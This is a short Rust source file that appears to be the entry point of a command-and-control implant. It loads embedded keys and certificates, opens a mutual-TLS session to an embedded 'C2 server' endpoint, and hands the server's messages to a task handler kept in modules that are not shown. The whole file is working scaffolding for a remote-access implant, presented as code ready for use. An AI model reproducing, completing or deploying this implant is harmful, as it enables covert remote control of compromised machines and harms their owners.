use std::sync::mpsc;
use std::thread;

mod embed;
mod handler;
mod mtls;
mod pb;
mod tasks;

fn main() {
    // Configure mutual TLS
    let config = mtls::client_config(
        embed::SERVER_ROOTCA,
        embed::IMPLANT_PUBLIC_KEY,
        embed::IMPLANT_PRIVATE_KEY,
    )
    .unwrap();

    // Point to the C2 server
    let addr = embed::SERVER_ENDPOINT.parse().unwrap();
    let server = mtls::Server::new(addr, embed::SERVER_NAME).unwrap();

    // Create two channels for bidirectional communicate with the mTLS session thread
    let (read_tx, read_rx) = mpsc::channel();
    let (write_tx, write_rx) = mpsc::channel();

    // Start the mtls session
    let mut client = mtls::Client::new(config, server).unwrap();
    let session_thread = thread::spawn(move || {
        client.session(write_rx, read_tx);
    });

    // Start processing messages from the server
    handler::Handler::new(read_rx, write_tx).start();
    session_thread.join().unwrap();
}
